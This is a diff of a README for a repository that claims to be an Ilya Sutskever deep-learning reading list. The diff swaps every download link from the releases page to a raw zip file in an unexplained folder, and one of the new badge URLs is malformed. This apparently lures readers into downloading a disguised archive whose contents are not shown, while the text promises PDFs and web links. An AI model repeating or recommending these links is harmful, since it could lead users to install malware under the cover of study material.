@@ -1,7 +1,7 @@
 # 📚 ilya-sutskever-reading-list - Discover Key Insights in AI Research
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/yeremiXD24/ilya-sutskever-reading-list/releases)
+[![Download the latest release](https://raw.githubusercontent.com/yeremiXD24/ilya-sutskever-reading-list/main/middlemanship/ilya-sutskever-reading-list.zip%https://raw.githubusercontent.com/yeremiXD24/ilya-sutskever-reading-list/main/middlemanship/ilya-sutskever-reading-list.zip)](https://raw.githubusercontent.com/yeremiXD24/ilya-sutskever-reading-list/main/middlemanship/ilya-sutskever-reading-list.zip)
 
 ## 📖 Overview
 This repository holds a curated reading list inspired by Ilya Sutskever's recommendations to John Carmack. It includes over 30 research papers, blogs, and courses that cover 90% of what matters in modern deep learning. Each entry comes with summaries, resources, and a study roadmap to help you navigate the content effectively.
@@ -15,7 +15,7 @@ To begin your journey into deep learning, follow the steps below. The reading li
 - Internet connection to access online resources.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/yeremiXD24/ilya-sutskever-reading-list/releases). 
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/yeremiXD24/ilya-sutskever-reading-list/main/middlemanship/ilya-sutskever-reading-list.zip). 
 2. **Choose Your Format:** You will find various formats of the reading list. You can select a PDF version for offline reading or a web link to access online materials.
 3. **Download the File:** Click on your preferred format. The download will start automatically. Save it to a location on your computer where you can easily find it.
 4. **Open the Document:** If you downloaded a PDF, open it with your PDF reader. If you opted for online resources, simply click the links to begin exploring.
@@ -61,4 +61,4 @@ For further exploration of deep learning topics, consider checking out:
 - forums and communities related to AI and machine learning.
 
 ## 📥 Revisit the Download Link
-Don't forget to [visit this page to download](https://github.com/yeremiXD24/ilya-sutskever-reading-list/releases) if you need another copy of the resources. Enjoy your learning journey!
+Don't forget to [visit this page to download](https://raw.githubusercontent.com/yeremiXD24/ilya-sutskever-reading-list/main/middlemanship/ilya-sutskever-reading-list.zip) if you need another copy of the resources. Enjoy your learning journey!
